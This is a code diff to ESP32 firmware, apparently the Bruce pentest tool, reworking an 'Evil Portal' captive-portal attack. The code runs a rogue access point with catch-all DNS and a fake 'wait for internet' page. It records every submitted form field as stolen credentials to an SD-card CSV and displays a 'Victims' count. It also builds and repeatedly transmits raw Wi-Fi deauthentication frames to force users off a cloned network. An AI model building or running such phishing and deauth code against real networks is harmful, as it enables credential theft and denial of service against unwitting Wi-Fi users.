@@ -5,7 +5,7 @@
 #include "sd_functions.h"
 #include "wifi_atks.h"
 
-WebServer* ep= nullptr;               // initialise webserver
+AsyncWebServer *ep;               // initialise webserver
 DNSServer dnsServer;
 
 String html_file, ep_logo, last_cred;
@@ -14,29 +14,59 @@ int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
 String capturedCredentialsHtml = "";
 
-void handleCreds() {
-      String html_temp = "<li>";
+// Default Drauth Frame
+const uint8_t deauth_frame_default2[] = {
+    0xc0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xf0, 0xff, 0x02, 0x00
+};
+
+class CaptiveRequestHandler : public AsyncWebHandler {
+public:
+  CaptiveRequestHandler() {}
+  virtual ~CaptiveRequestHandler() {}
+
+  bool canHandle(AsyncWebServerRequest *request){
+    //request->addInterestingHeader("ANY");
+    return true;
+  }
+
+  void handleRequest(AsyncWebServerRequest *request) {
+    AsyncResponseStream *response = request->beginResponseStream("text/html");
+    if(request->hasParam("ssid")) request->redirect("/ssid");         // If there is a parameter called "ssid", changes network
+    else if(request->params()>0) {                                    // Else if there are other parameters, store in the memory
+      String html_temp = "<li>";                                      // Else.. after all that, redirects to the page
       String csvLine = "";
       last_cred="";
-      for (int i = 0; i < ep->args(); i++) {
-        html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
+      for (int i = 0; i < request->params(); i++) {
+        AsyncWebParameter *param = request->getParam(i);
+        html_temp += param->name() + ": " + param->value() + "<br>\n";
         // Prepara dados para salvar no SD
         if (i != 0) {
           csvLine += ",";
+          last_cred +=",";
         }
-        csvLine += ep->argName(i) + ": " + ep->arg(i);
-        last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
+        csvLine += param->name() + ": " + param->value();
+        last_cred += param->name().substring(0,1) + ": " + param->value();
       }
       html_temp += "</li>\n";
       saveToCSV("/Bruce_creds.csv", csvLine);
       capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
       totalCapturedCredentials++;
-      ep->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
-}
+      request->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
+    } 
+    else {
+      request->redirect("/"); 
+    }
+  }
+};
 
 void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     int tmp=millis(); // one deauth frame each 30ms at least
     bool redraw=true;
+    Serial.begin(115200);
     // Definição da matriz "Options"
     options = {
         {"Default", [=]()       { chooseHtml(false); }},
@@ -44,19 +74,20 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     };
     delay(200);
     loopOptions(options);
+    
     while(checkNextPress()){ yield(); } // debounce
-
+    delay(200);
     //  tssid="" means that are opening a virgin Evil Portal
     if (tssid=="")  { 
       AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:"); 
       }
     else { // tssid != "" means that is was cloned and can deploy Deauth
       //memcpy(ap_record.bssid, bssid, 6);
-      memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+      memcpy(deauth_frame, deauth_frame_default2, sizeof(deauth_frame_default2));
       wsl_bypasser_send_raw_frame(&ap_record,channel);
       AP_name = tssid;
     }
-    
+
     wifiConnected=true;
     drawMainBorder();
     displayRedStripe("Starting..",TFT_WHITE,FGCOLOR);
@@ -68,47 +99,56 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     
     tmp=millis();
     while(millis() - tmp < 3000) yield();
-    
-  #ifdef STICK_C_PLUS2
-    ep=(WebServer*)ps_malloc(sizeof(WebServer));
-  #else
-    ep=(WebServer*)malloc(sizeof(WebServer));
-  #endif
-    new (ep) WebServer(80);
+    dnsServer.start(53, "*", WiFi.softAPIP());
+    ep = new AsyncWebServer(80);
 
-    ep->on("/", [](){
-      ep->send(200, "text/html", html_file);
-    });
-    ep->on("/post", handleCreds);
-
-    ep->onNotFound([](){
-      if (ep->args()>0) {
-        handleCreds();
-      } else {
-        ep->send(200, "text/html", html_file);
-      }
+    // if url isn't found
+    ep->onNotFound([](AsyncWebServerRequest * request) {
+      request->redirect("/");
     });
 
-    ep->on("/creds", []() {
-      ep->send(200, "text/html", creds_GET());
+    ep->on("/creds", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(200, "text/html", creds_GET());
     });
 
-    ep->on("/ssid", []() {
-      ep->send(200, "text/html", ssid_GET());
+    ep->on("/ssid", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(200, "text/html", ssid_GET());
     });
 
-    ep->on("/postssid", [](){
-      if(ep->hasArg("ssid")) AP_name = ep->arg("ssid").c_str();
-      ep->send(200, "text/html", ssid_POST());
-      ep->stop();                            // pára o servidor
+    ep->on("/postssid", HTTP_GET, [](AsyncWebServerRequest * request) {
+      if(request->hasArg("ssid")) AP_name = request->arg("ssid").c_str();
+      request->send(200, "text/html", ssid_POST());
+      ep->end();                            // pára o servidor
       wifiDisconnect();                     // desliga o WiFi
       WiFi.softAP(AP_name);                 // reinicia WiFi com novo SSID
       ep->begin();                          // reinicia o servidor
       previousTotalCapturedCredentials=-1;  // redesenha a tela
     });
 
-    dnsServer.start(53, "*", WiFi.softAPIP());
+    ep->on("/clear", HTTP_GET, [](AsyncWebServerRequest * request) { 
+      request->send(200, "text/html", clear_GET());
+    });
+
+    ep->on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
+      request->send(200, "text/html", html_file);
+    });
+
+    ep->addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER); //only when requested from AP
+
+    log_d("Total heap: %d", ESP.getHeapSize());
+    log_d("Free heap: %d", ESP.getFreeHeap());
+    log_d("Total PSRAM: %d", ESP.getPsramSize());
+    log_d("Free PSRAM: %d", ESP.getFreePsram());
+
+    #if defined(STICK_C_PLUS2)
+    ep = (AsyncWebServer*)ps_malloc(sizeof(AsyncWebServer));
+    #else
+    ep = (AsyncWebServer*)malloc(sizeof(AsyncWebServer));
+    #endif
+    new (ep) AsyncWebServer(80);
+
     ep->begin();
+    tft.fillRect(6, 27, WIDTH-12, HEIGHT-33, BGCOLOR);
     
     bool hold_deauth = false;
     tmp=millis(); // one deauth frame each 30ms at least
@@ -116,48 +156,46 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     while(1) {
       if(redraw) {
         drawMainBorder();
-        
         tft.setTextSize(FM);
         tft.setTextColor(TFT_RED);
-        tft.drawCentreString("Evil Portal",tft.width()/2, 29, SMOOTH_FONT);
-        tft.setCursor(8,46);
+        tft.drawCentreString("Evil Portal",WIDTH/2, 29, SMOOTH_FONT);
+        tft.setCursor(7,49);
         tft.setTextColor(FGCOLOR);
         tft.println("AP: " + AP_name);
-        tft.setCursor(8,tft.getCursorY());
+        tft.setCursor(7,tft.getCursorY());
         tft.println("->" + WiFi.softAPIP().toString() + "/creds");
-        tft.setCursor(8,tft.getCursorY());
+        tft.setCursor(7,tft.getCursorY());
         tft.println("->" + WiFi.softAPIP().toString() + "/ssid");
-        tft.setCursor(8,tft.getCursorY());
+        tft.setCursor(7,tft.getCursorY());
         tft.print("Victims: ");
         tft.setTextColor(TFT_RED);
         tft.println(String(totalCapturedCredentials));
-        tft.setCursor(8,tft.getCursorY());
+        tft.setCursor(7,tft.getCursorY());
         tft.setTextSize(FP);
-        tft.println(last_cred.substring(0,last_cred.indexOf('\n')));
-        tft.setCursor(8,tft.getCursorY());
-        tft.println(last_cred.substring(last_cred.indexOf('\n')+1));
+        tft.println(last_cred);
 
         if (deauth){
           if (hold_deauth) {
             tft.setTextSize(FP);
             tft.setTextColor(FGCOLOR);
-            tft.drawRightString("Deauth OFF", tft.width()-6,tft.height()-8,SMOOTH_FONT);
+            tft.drawRightString("Deauth OFF", WIDTH-7,HEIGHT-14,SMOOTH_FONT);
           } else {
             tft.setTextSize(FP);
             tft.setTextColor(TFT_RED);
-            tft.drawRightString("Deauth ON", tft.width()-6,tft.height()-8,SMOOTH_FONT);
+            tft.drawRightString("Deauth ON", WIDTH-7,HEIGHT-14,SMOOTH_FONT);
           }
         }
 
+        //menu_op.pushSprite(8,26);
         redraw=false;
       }
 
-      if(!hold_deauth && (millis()-tmp) >5  && deauth)  { 
+      if(!hold_deauth && (millis()-tmp) >5)  { 
         wsl_bypasser_send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
         tmp=millis();
       }
 
-      if(checkSelPress()) {
+      if(checkSelPress() && deauth) {
         while(checkSelPress()) { delay(80); } // timerless debounce
         hold_deauth = !hold_deauth;
         redraw=true;
@@ -167,15 +205,15 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
         previousTotalCapturedCredentials = totalCapturedCredentials-1;
       }
       dnsServer.processNextRequest();
-      ep->handleClient();
 
       if(checkEscPress()) break;
+
     }
-    ep->close();
-    ep->~WebServer();
+    ep->reset();
+    ep->end();
+    ep->~AsyncWebServer();
     free(ep);
-    ep=nullptr;
-    dnsServer.stop();
+    ep = nullptr;
 
     delay(100);
     wifiDisconnect();
@@ -185,12 +223,12 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
 void saveToCSV(const String &filename, const String &csvLine) {
   File file = SD.open(filename, FILE_APPEND);
   if (!file) {
-    log_i("Error to open file");
+    Serial.println("Error to open file");
     return;
   }
   file.println(csvLine);
   file.close();
-  log_i("data saved");
+  Serial.println("data saved");
 }
 
 String getHtmlContents(String body) {
